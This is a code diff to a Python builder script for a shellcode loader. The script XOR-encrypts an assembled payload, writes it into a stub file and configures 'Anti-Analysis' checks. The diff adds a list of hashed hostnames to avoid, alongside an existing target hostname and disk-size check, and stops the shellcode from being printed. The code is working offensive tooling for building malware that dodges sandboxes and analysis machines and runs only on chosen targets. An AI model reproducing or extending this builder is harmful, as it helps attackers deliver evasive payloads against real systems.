@@ -23,6 +23,9 @@ STUB_FILE = config.get("Stub", "filename")
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
 TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")
+AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
+if len(AVOID_HOSTNAME) == 1 and AVOID_HOSTNAME[0] == "":
+    AVOID_HOSTNAME = []
 
 WORKING_FOLDER = "temp/"
 
@@ -72,8 +75,21 @@ def main():
                 if parts[1] == "DISKSIZE":
                     sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
                 if parts[1] == "TARGET_HOSTNAME":
-                    sed_file(WORKING_FOLDER+filename, tag, TARGET_HOSTNAME)
-                # AVOID todo
+                    if len(TARGET_HOSTNAME):
+                        sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME))
+                        print("Target hostname: ", TARGET_HOSTNAME)
+                    else:
+                        sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
+                if parts[1] == "AVOID_HOSTNAME":
+                    if len(AVOID_HOSTNAME):
+                        res = ""
+                        for hostname in AVOID_HOSTNAME:
+                            if hostname != "":
+                                res += hash_obj("",hostname)+","
+                        sed_file(WORKING_FOLDER+filename, tag, res[:-1])
+                        print("Avoid hostnames: ", AVOID_HOSTNAME)
+                    else:
+                        sed_file(WORKING_FOLDER+filename, tag, "{0, 0, false}")
 
 
     if PAYLOAD_FILE.endswith(".nasm") or PAYLOAD_FILE.endswith(".asm"):
@@ -93,10 +109,10 @@ def main():
 
     # Encrypt the shellcode
     print("===========ENCRYPTION==============")
-    print(instructions)
+    # print(instructions)
     print(f"\nEncrypted with '{hex(ENCRYPTION_KEY)}'\n")
     encrypted_instructions = xor2_encrypt_decrypt(instructions, ENCRYPTION_KEY)
-    print(encrypted_instructions)
+    # print(encrypted_instructions)
     print("===================================\n")
     sed_file(WORKING_FOLDER+STUB_FILE, "%SHELLCODE%", format_instructions(encrypted_instructions))
     sed_file(WORKING_FOLDER+STUB_FILE, "%XOR_KEY%", str(ENCRYPTION_KEY))
